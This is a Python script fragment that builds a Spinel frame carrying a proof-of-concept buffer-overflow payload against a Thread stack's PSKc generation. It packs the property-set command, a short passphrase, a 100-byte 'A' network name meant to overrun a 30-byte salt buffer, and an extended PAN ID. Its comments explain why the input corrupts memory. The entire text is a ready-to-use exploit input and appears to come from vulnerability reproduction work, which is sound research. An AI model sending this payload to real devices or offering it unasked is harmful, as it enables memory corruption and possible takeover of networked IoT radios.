# Spinel frame format:
# Header: 0x80 | TID (let's use TID=0)
header = bytes([0x80])

# Command: SPINEL_CMD_PROP_VALUE_SET = 3 (packed uint)
# For values < 127, packed uint is just the byte itself
command = bytes([3])

# Property key: SPINEL_PROP_MESHCOP_COMMISSIONER_GENERATE_PSKC = 0x1807
# Packed uint encoding: for values >= 0x80, use multi-byte encoding
# 0x1807 = 0b_1_1000_0000_0111
# In packed uint: lower 7 bits first, with continuation bit
# 0x1807 = 6151
# 6151 & 0x7F = 0x07, 6151 >> 7 = 48
# 48 & 0x7F = 0x30, 48 >> 7 = 0
# So: 0x07 | 0x80 = 0x87, then 0x30
prop_key = bytes([0x87, 0x30])

# Passphrase: must be 6-255 chars, let's use "pass12" (6 chars) + null terminator
passphrase = b"pass12\x00"

# Network name: long enough to overflow the 30-byte salt buffer
# Salt = "Thread" (6) + extPanId (8) + networkName
# Buffer is 30 bytes, so network name > 16 bytes will overflow
# Let's use 100 bytes of 'A' to trigger overflow
network_name = b"A" * 100 + b"\x00"

# Extended PAN ID: 8 bytes, with length prefix (uint16 = 8)
ext_pan_id = struct.pack("<H", 8) + b"\x11" * 8

# Full spinel frame payload
spinel_frame = header + command + prop_key + passphrase + network_name + ext_pan_id

print(f"Spinel frame length: {len(spinel_frame)}")
print(f"Spinel frame hex: {spinel_frame.hex()}")

